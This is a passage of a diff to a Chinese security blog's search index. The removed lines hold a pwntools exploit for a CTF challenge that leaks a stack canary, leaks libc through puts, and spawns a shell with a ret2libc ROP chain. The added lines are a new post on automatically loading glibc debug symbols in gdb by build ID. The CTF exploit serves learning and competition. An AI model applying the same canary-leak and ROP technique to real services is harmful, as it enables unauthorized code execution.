-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>CVE</tag>
       </tags>
   </entry>
   <entry>
@@ -2455,6 +2455,90 @@
       <tags>
         <tag>pwn</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>带符号调试-gdb脚本实现自动化加载</title>
+    <url>/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h2 id="带符号调试-gdb脚本实现自动化加载"><a href="#带符号调试-gdb脚本实现自动化加载" class="headerlink" title="带符号调试-gdb脚本实现自动化加载"></a>带符号调试-gdb脚本实现自动化加载</h2><h4 id="问题由来"><a href="#问题由来" class="headerlink" title="问题由来"></a>问题由来</h4><p>在对于堆的<code>_IO_FILE</code>利用的学习过程中，我们通常需要伪造一个fake_IO_FILE，并且附带源码调试，以方便清除是否进入了目标函数，是否一些条件判断通过。但是有时候却在pwndbg加载时找不到对应的glibc的symbol file文件，这就导致我们无法进行源码级别调试，而且看结构体只能自己一个一个字段带进去看，十分麻烦。所以这里介绍一下如何方便地进行带符号调试。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103232492.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103325230.png"
+                      class=""
+                >
+
+<h4 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h4><h5 id="Build-ID"><a href="#Build-ID" class="headerlink" title="Build ID"></a>Build ID</h5><p><code>Build ID</code> 是 ELF 文件（可执行文件和共享库）中一个独特的标识符，用于标识文件的内容。它是一个不可变的标志，通常用来快速匹配文件与其调试符号或源代码。</p>
+<hr>
+<h6 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a><strong>主要用途</strong></h6><ol>
+<li><strong>唯一标识 ELF 文件</strong>：<ul>
+<li>即使文件名或路径改变，<code>Build ID</code> 仍然可以唯一标识文件。</li>
+<li>不同编译选项或源代码的修改会导致新的 <code>Build ID</code>。</li>
+</ul>
+</li>
+<li><strong>关联调试符号和源代码</strong>：<ul>
+<li>调试符号文件（如 <code>.debug</code> 文件）通常使用 <code>Build ID</code> 来匹配对应的 ELF 文件。</li>
+</ul>
+</li>
+<li><strong>软件包管理和安全检查</strong>：<ul>
+<li>用于确保文件未被篡改，或用于匹配特定版本的依赖项。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h6 id="生成方式"><a href="#生成方式" class="headerlink" title="生成方式"></a><strong>生成方式</strong></h6><p><code>Build ID</code> 是通过对 ELF 文件的内容（如代码段和数据段）进行哈希计算生成的，具体方式取决于工具链。它通常由 <strong>编译器</strong> 或 <strong>链接器</strong> 自动生成，存储在 ELF 文件的 <code>.note.gnu.build-id</code> 段中。</p>
+<h6 id="查看-ELF-文件的-Build-ID"><a href="#查看-ELF-文件的-Build-ID" class="headerlink" title="查看 ELF 文件的 Build ID"></a><strong>查看 ELF 文件的 Build ID</strong></h6><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.readelf -n /path/to/file | grep &#x27;Build ID&#x27;</span><br><span class="line">2.file /path/to/file</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="debug"><a href="#debug" class="headerlink" title=".debug"></a>.debug</h5><p>通常<code>symbol file</code>会在一个<code>.debug/.build-id/xx/</code>的目录下，这里在<code>build-id</code>中会有一堆2位16进制数构成的目录名，实际在.debug文件检索时，会先根据<code>build-id</code>的第一个字节（最高位）来进入对应前缀的文件夹，然后在该目录下找对应的.debug文件。比如我们的<code>build-id</code>为<code>89c3cb85f9e55046776471fed05ec441581d1969</code>，那么我们目标的.debug文件就在<code>.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</code>这个位置。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105018012.png"
+                      class=""
+                >
+
+
+
+<h4 id="手动加载符号文件"><a href="#手动加载符号文件" class="headerlink" title="手动加载符号文件"></a>手动加载符号文件</h4><p>一般来说，我们用<code>glibc-all-in-one</code>下载到的glibc都是连带着<code>.debug</code>一起下的，但我们pwndbg会找不到目标的符号文件。我们可以直接在gdb中用<code>add-symbol-file /path/to/.debug</code>来读取符号信息。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105847709.png"
+                      class=""
+                >
+
+<p>或者也可以在<code>~/.gdbinit</code>中加一个<code>set debug-file-directory /path/to/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/</code>，然后进入gdb时就会自动检索到<code>.debug</code>文件，附加调试符号信息。</p>
+<h4 id="自动化进行附加符号文件"><a href="#自动化进行附加符号文件" class="headerlink" title="自动化进行附加符号文件"></a>自动化进行附加符号文件</h4><p>既然我们已经知道了手动附加的原理，这里我们就可以尝试使用脚本进行自动化附加。这里我们选择用gdb中的<code>info proc mappings</code>命令来获取libc的基址以及路径，后续.debug文件路径的判断也是基于此。所以我们想要附加生效，就要链接到glibc-all-in-one中的libc。</p>
+<p>在gdbinit中加入如下命令，这里使用了<code>gdb.events.stop.connect</code>来使gdb在停下来的时候调用函数进行加载<code>symbol file</code>，这是因为gdb.attach(p)时，<code>.gdbinit</code>是先加载后再把gdb附加到进程的，如果直接调用会报错。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">DEBUG_FILE_DIR = <span class="string">&quot;/home/collectcrop/glibc_run/glibc-all-in-one/libs&quot;</span></span><br><span class="line">symbols_loaded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_build_id</span>(<span class="params">lib_path</span>):</span><br><span class="line">    <span class="comment">#从给定的库路径提取 build-id</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#用外部命令获取build id</span></span><br><span class="line">        res = subprocess.check_output(</span><br><span class="line">            <span class="string">f&quot;readelf -n <span class="subst">&#123;lib_path&#125;</span> | grep &#x27;Build ID&#x27;&quot;</span>, </span><br><span class="line">            shell=<span class="literal">True</span>, </span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 提取 Build ID 字符串</span></span><br><span class="line">        build_id = res[res.find(<span class="string">&#x27;:&#x27;</span>)+<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Build ID: <span class="subst">&#123;build_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> build_id</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> gdb.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error extracting build-id for <span class="subst">&#123;lib_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_debug_symbols</span>():</span><br><span class="line">    <span class="keyword">global</span> symbols_loaded</span><br><span class="line">    mappings = gdb.execute(<span class="string">&quot;info proc mappings&quot;</span>, to_string=<span class="literal">True</span>).splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;/libc.so&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            libc_path = parts[-<span class="number">1</span>]</span><br><span class="line">            libc_base = parts[<span class="number">0</span>]</span><br><span class="line">            build_id = get_build_id(libc_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> build_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Could not determine Build ID for libc.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            DEBUG_FILE_DIR = libc_path.replace(<span class="string">&quot;/libc.so.6&quot;</span>, <span class="string">&quot;/.debug/.build-id&quot;</span>)</span><br><span class="line">            <span class="comment"># 解析 .debug 文件路径</span></span><br><span class="line">            debug_file_path = os.path.join(</span><br><span class="line">                DEBUG_FILE_DIR,</span><br><span class="line">                build_id[:<span class="number">2</span>],</span><br><span class="line">                build_id[<span class="number">2</span>:].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.debug&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] debug file: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(DEBUG_FILE_DIR):</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(debug_file_path):</span><br><span class="line">                    gdb.execute(<span class="string">f&quot;add-symbol-file <span class="subst">&#123;debug_file_path&#125;</span> <span class="subst">&#123;libc_base&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded symbols for <span class="subst">&#123;libc_path&#125;</span> from <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] Debug file not found: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Build ID directory not found: <span class="subst">&#123;DEBUG_FILE_DIR&#125;</span>&quot;</span>)</span><br><span class="line">            symbols_loaded = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟加载符号，确保附加到进程后运行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_stop</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> symbols_loaded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Target process stopped. Attempting to load symbols...&quot;</span>)</span><br><span class="line">        load_debug_symbols()</span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(on_stop)</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>然后就能愉快地调试了，好耶。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123121652093.png"
+                      class=""
+                >
+
+
+
+<h4 id="一般换库步骤"><a href="#一般换库步骤" class="headerlink" title="一般换库步骤"></a>一般换库步骤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./libc.so.6  | grep &#x27;GNU&#x27;		#看给的libc版本</span><br><span class="line">ldd ./binary							#看程序动态链接库的情况</span><br><span class="line">patchelf --replace-needed original_libc target_libc ./binary	#换libc，original_libc由上面ldd能看到</span><br><span class="line">patchelf --set-interpreter target_ld ./binary					#换ld</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>debug</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>gdb</tag>
+        <tag>debug</tag>
       </tags>
   </entry>
   <entry>
